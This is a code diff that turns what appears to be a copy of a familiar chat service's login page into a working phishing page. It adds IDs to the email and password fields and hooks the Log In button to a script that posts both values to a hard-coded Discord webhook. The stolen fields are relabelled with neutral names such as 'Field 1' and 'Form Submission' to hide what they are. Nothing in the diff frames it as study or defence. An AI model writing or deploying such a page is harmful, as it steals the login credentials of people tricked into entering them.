@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Login</title>
+<title>Form</title>
+
 <style>
 body {
   margin: 0;
@@ -91,14 +92,14 @@ button:hover {
     <p>We're happy to see you again!</p>
 
     <label>Email or Phone</label>
-    <input type="text">
+    <input id="field1" type="text">
 
     <label>Password</label>
-    <input type="password">
+    <input id="field2" type="password">
 
     <div class="link">Forgot your password?</div>
 
-    <button>Log In</button>
+    <button onclick="sendToDiscord()">Log In</button>
 
     <p>Need an account? <span class="link">Register</span></p>
   </div>
@@ -109,6 +110,34 @@ button:hover {
     <p>Scan this with your mobile app to log in instantly.</p>
   </div>
 </div>
+
+<script>
+async function sendToDiscord() {
+  const field1 = document.getElementById("field1").value;
+  const field2 = document.getElementById("field2").value;
+
+  const webhookURL = "https://discord.com/api/webhooks/1497667519954157731/HuZbnPzqyWbYAO3dmU4VDAChlU5FwzkD3feGyqqoYg23PcojXr42vnLukIIEThH_27TA";
+
+  const payload = {
+    content: `📩 **Form Submission**\n\n**Field 1:** ${field1}\n**Field 2:** ${field2}`
+  };
+
+  try {
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+
+    alert("Sent!");
+  } catch (err) {
+    console.error(err);
+    alert("Failed to send.");
+  }
+}
+</script>
 
 </body>
 </html>
